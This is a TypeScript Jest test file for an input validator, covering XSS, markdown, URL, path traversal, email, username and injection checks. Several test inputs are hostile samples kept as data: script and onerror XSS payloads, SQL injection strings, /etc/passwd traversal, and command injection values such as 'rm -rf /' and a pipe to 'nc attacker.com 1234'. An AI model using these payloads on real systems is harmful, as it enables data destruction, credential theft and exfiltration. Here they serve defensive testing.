/**
 * InputValidator Unit Tests
 * 
 * Comprehensive tests for input validation and sanitization
 * covering XSS, SQL injection, command injection, and path traversal prevention.
 */

import { describe, it, expect, beforeEach } from '@jest/globals';
import { InputValidator, ValidationError } from '../../security/InputValidator.js';

describe('InputValidator', () => {
  let validator: InputValidator;

  beforeEach(() => {
    validator = new InputValidator();
  });

  describe('validateMessage', () => {
    it('should validate a well-formed message', () => {
      const message = {
        type: 'test_message',
        payload: { data: 'test' },
      };

      const result = validator.validateMessage(message);

      expect(result.type).toBe('test_message');
      expect(result.payload).toEqual({ data: 'test' });
    });

    it('should reject non-object messages', () => {
      expect(() => validator.validateMessage('string')).toThrow(ValidationError);
      expect(() => validator.validateMessage(null)).toThrow(ValidationError);
      expect(() => validator.validateMessage(undefined)).toThrow(ValidationError);
    });

    it('should reject messages without type', () => {
      expect(() => validator.validateMessage({ payload: 'data' })).toThrow(
        ValidationError
      );
    });

    it('should reject messages with invalid type format', () => {
      expect(() =>
        validator.validateMessage({ type: 'invalid type!' })
      ).toThrow(ValidationError);

      expect(() =>
        validator.validateMessage({ type: 'invalid<script>' })
      ).toThrow(ValidationError);
    });

    it('should accept valid type formats', () => {
      const validTypes = [
        'simple',
        'under_score',
        'with:colon',
        'mixed_123:type',
      ];

      validTypes.forEach((type) => {
        const result = validator.validateMessage({ type });
        expect(result.type).toBe(type);
      });
    });

    it('should sanitize payload content', () => {
      const message = {
        type: 'test',
        payload: {
          text: '  trimmed  ',
          nested: { value: 'data' },
        },
      };

      const result = validator.validateMessage(message);
      
      expect(result.payload.text).toBe('trimmed');
    });
  });

  describe('sanitizeString', () => {
    it('should trim whitespace', () => {
      expect(validator.sanitizeString('  test  ')).toBe('test');
      expect(validator.sanitizeString('\t\ntest\n\t')).toBe('test');
    });

    it('should remove null bytes', () => {
      expect(validator.sanitizeString('test\0data')).toBe('testdata');
    });

    it('should enforce max length', () => {
      const longString = 'a'.repeat(100);
      
      expect(() => validator.sanitizeString(longString, 50)).toThrow(
        ValidationError
      );
    });

    it('should accept string within length limit', () => {
      const validString = 'a'.repeat(50);
      
      expect(validator.sanitizeString(validString, 100)).toBe(validString);
    });

    it('should reject non-string input', () => {
      expect(() => validator.sanitizeString(123 as any)).toThrow(
        ValidationError
      );
    });
  });

  describe('sanitizeHtml - XSS Prevention', () => {
    it('should escape script tags', () => {
      const malicious = '<script>alert("xss")</script>';
      const sanitized = validator.sanitizeHtml(malicious);

      expect(sanitized).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
      expect(sanitized).not.toContain('<script>');
    });

    it('should escape event handlers', () => {
      const malicious = '<img src=x onerror=alert("xss")>';
      const sanitized = validator.sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
    });

    it('should escape all HTML special characters', () => {
      const specialChars = '&<>"\'/'  ;
      const expected = '&amp;&lt;&gt;&quot;&#x27;&#x2F;';

      expect(validator.sanitizeHtml(specialChars)).toBe(expected);
    });

    it('should handle nested HTML attacks', () => {
      const nested = '<<script>script>alert("xss")<</>script>';
      const sanitized = validator.sanitizeHtml(nested);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('&lt;');
    });

    it('should handle URL encoding tricks', () => {
      const encoded = '<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;>';
      const sanitized = validator.sanitizeHtml(encoded);

      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
    });
  });

  describe('sanitizeMarkdown', () => {
    it('should remove javascript: URLs from links', () => {
      const malicious = '[Click me](javascript:alert("xss"))';
      const sanitized = validator.sanitizeMarkdown(malicious);

      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('about:blank');
    });

    it('should remove data: URLs except safe images', () => {
      const malicious = '[Download](data:text/html,<script>alert("xss")</script>)';
      const sanitized = validator.sanitizeMarkdown(malicious);

      expect(sanitized).not.toContain('data:text/html');
      expect(sanitized).toContain('about:blank');
    });

    it('should allow safe image data URLs', () => {
      const safe = '[Image](data:image/png;base64,iVBORw0KGgoAAAANS...)';
      const sanitized = validator.sanitizeMarkdown(safe);

      expect(sanitized).toContain('data:image&#x2F;png');
    });

    it('should sanitize HTML within markdown', () => {
      const markdown = '# Title\n\n<script>alert("xss")</script>';
      const sanitized = validator.sanitizeMarkdown(markdown);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('&lt;script&gt;');
    });
  });

  describe('validateUrl', () => {
    it('should accept valid HTTP URLs', () => {
      expect(validator.validateUrl('http://example.com')).toBe(true);
      expect(validator.validateUrl('https://example.com/path')).toBe(true);
    });

    it('should accept valid WebSocket URLs', () => {
      expect(validator.validateUrl('ws://localhost:8080')).toBe(true);
      expect(validator.validateUrl('wss://example.com')).toBe(true);
    });

    it('should reject javascript: URLs', () => {
      expect(() =>
        validator.validateUrl('javascript:alert("xss")')
      ).toThrow(ValidationError);
    });

    it('should reject data: URLs', () => {
      expect(() =>
        validator.validateUrl('data:text/html,<script>alert("xss")</script>')
      ).toThrow(ValidationError);
    });

    it('should reject file: URLs', () => {
      expect(() =>
        validator.validateUrl('file:///etc/passwd')
      ).toThrow(ValidationError);
    });

    it('should reject URLs with event handlers', () => {
      expect(() =>
        validator.validateUrl('http://example.com?param=<img onerror=alert(1)>')
      ).toThrow(ValidationError);
    });

    it('should enforce max URL length', () => {
      const longUrl = 'http://example.com/' + 'a'.repeat(3000);
      
      expect(() => validator.validateUrl(longUrl)).toThrow(ValidationError);
    });

    it('should reject malformed URLs', () => {
      expect(() => validator.validateUrl('not a url')).toThrow(ValidationError);
      expect(() => validator.validateUrl('htp://invalid')).toThrow(ValidationError);
    });
  });

  describe('validateFilePath - Path Traversal Prevention', () => {
    it('should accept safe relative paths', () => {
      expect(validator.validateFilePath('file.txt')).toBe(true);
      expect(validator.validateFilePath('folder/file.json')).toBe(true);
    });

    it('should reject parent directory traversal', () => {
      expect(() => validator.validateFilePath('../etc/passwd')).toThrow(
        ValidationError
      );
      expect(() => validator.validateFilePath('../../secret.txt')).toThrow(
        ValidationError
      );
    });

    it('should reject absolute paths', () => {
      expect(() => validator.validateFilePath('/etc/passwd')).toThrow(
        ValidationError
      );
      expect(() => validator.validateFilePath('~/file.txt')).toThrow(
        ValidationError
      );
    });

    it('should reject paths with backslashes', () => {
      expect(() => validator.validateFilePath('folder\\file.txt')).toThrow(
        ValidationError
      );
    });

    it('should reject paths with double slashes', () => {
      expect(() => validator.validateFilePath('folder//file.txt')).toThrow(
        ValidationError
      );
    });

    it('should reject paths with null bytes', () => {
      expect(() => validator.validateFilePath('file\0.txt')).toThrow(
        ValidationError
      );
    });

    it('should validate file extensions', () => {
      expect(validator.validateFilePath('document.pdf')).toBe(true);
      expect(validator.validateFilePath('data.json')).toBe(true);
      expect(() => validator.validateFilePath('script.exe')).toThrow(
        ValidationError
      );
    });
  });

  describe('validateEmail', () => {
    it('should accept valid email addresses', () => {
      expect(validator.validateEmail('user@example.com')).toBe(true);
      expect(validator.validateEmail('test.user@domain.co.uk')).toBe(true);
      expect(validator.validateEmail('user+tag@example.com')).toBe(true);
    });

    it('should reject invalid email formats', () => {
      expect(() => validator.validateEmail('invalid')).toThrow(ValidationError);
      expect(() => validator.validateEmail('@example.com')).toThrow(
        ValidationError
      );
      expect(() => validator.validateEmail('user@')).toThrow(ValidationError);
      expect(() => validator.validateEmail('user @example.com')).toThrow(
        ValidationError
      );
    });

    it('should enforce max email length', () => {
      const longEmail = 'a'.repeat(250) + '@example.com';
      
      expect(() => validator.validateEmail(longEmail)).toThrow(ValidationError);
    });

    it('should reject non-string input', () => {
      expect(() => validator.validateEmail(123 as any)).toThrow(
        ValidationError
      );
    });
  });

  describe('validateUsername', () => {
    it('should accept valid usernames', () => {
      expect(validator.validateUsername('user123')).toBe(true);
      expect(validator.validateUsername('test_user')).toBe(true);
      expect(validator.validateUsername('user-name')).toBe(true);
    });

    it('should reject usernames that are too short', () => {
      expect(() => validator.validateUsername('ab')).toThrow(ValidationError);
    });

    it('should reject usernames that are too long', () => {
      const longUsername = 'a'.repeat(51);
      
      expect(() => validator.validateUsername(longUsername)).toThrow(
        ValidationError
      );
    });

    it('should reject usernames with special characters', () => {
      expect(() => validator.validateUsername('user@name')).toThrow(
        ValidationError
      );
      expect(() => validator.validateUsername('user name')).toThrow(
        ValidationError
      );
      expect(() => validator.validateUsername('user.name')).toThrow(
        ValidationError
      );
    });

    it('should reject non-string input', () => {
      expect(() => validator.validateUsername(123 as any)).toThrow(
        ValidationError
      );
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect SQL keywords in user input', () => {
      // Note: The actual SQL injection prevention happens at the query level
      // But we can test that input sanitization removes dangerous characters
      
      const sqlAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords --",
      ];

      sqlAttempts.forEach((attempt) => {
        // Sanitizing HTML will escape quotes
        const sanitized = validator.sanitizeHtml(attempt);
        expect(sanitized).not.toContain("'");
        expect(sanitized).toContain('&#x27;');
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect shell metacharacters', () => {
      const commandAttempts = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 1234',
        'file.txt `whoami`',
        'file.txt $(cat /etc/passwd)',
      ];

      commandAttempts.forEach((attempt) => {
        // File path validation will catch most of these
        expect(() => validator.validateFilePath(attempt)).toThrow(
          ValidationError
        );
      });
    });
  });

  describe('Configuration', () => {
    it('should respect custom configuration', () => {
      const customValidator = new InputValidator({
        maxStringLength: 100,
        allowedProtocols: ['https'],
      });

      // Test custom max length
      expect(() =>
        customValidator.sanitizeString('a'.repeat(150))
      ).toThrow(ValidationError);

      // Test custom allowed protocols
      expect(() => customValidator.validateUrl('http://example.com')).toThrow(
        ValidationError
      );
      expect(customValidator.validateUrl('https://example.com')).toBe(true);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty strings', () => {
      expect(validator.sanitizeString('')).toBe('');
    });

    it('should handle Unicode characters', () => {
      const unicode = 'Hello 世界 🌍';
      expect(validator.sanitizeString(unicode)).toBe(unicode);
    });

    it('should handle very long inputs efficiently', () => {
      const veryLong = 'a'.repeat(15000); // Exceeds default maxStringLength of 10000
      
      expect(() => validator.sanitizeString(veryLong)).toThrow(ValidationError);
    });

    it('should handle nested objects', () => {
      const deepObject = {
        type: 'test',
        payload: {
          level1: {
            level2: {
              level3: {
                data: 'value',
              },
            },
          },
        },
      };

      expect(() => validator.validateMessage(deepObject)).not.toThrow();
    });
  });
});